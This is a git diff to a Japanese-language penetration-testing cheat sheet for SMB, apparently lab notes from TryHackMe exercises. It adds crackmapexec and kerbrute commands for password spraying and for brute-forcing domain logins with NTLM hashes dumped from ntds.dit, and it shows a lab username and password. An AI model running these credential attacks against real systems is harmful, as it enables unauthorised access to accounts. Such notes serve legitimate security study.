@@ -51,6 +51,8 @@ mget *
 smbmap -u "user" -p "pass" -H $TARGET -r
 ```
 
+## crackmapexec
+
 ### 接続可否の確認
 
 ```sh
@@ -61,4 +63,18 @@ crackmapexec smb windcorp.thm -u brittanycr -p 'thm1234#'
 
 ```sh
 crackmapexec smb $TARGET -u ./names.txt -p ./names.txt --no-bruteforce
+```
+
+### パスワードスプレー
+
+SMBではないが使いどころが近いので。
+
+```sh
+../kerbrute passwordspray -d DOMAIN.thm --dc $TARGET users.txt 'password'
+```
+
+### NTLMハッシュリストをブルートフォース（例：ntds.dit から出力）
+
+```sh
+crackmapexec smb $TARGET -u users.txt -H ntlm-hashes.txt
 ```
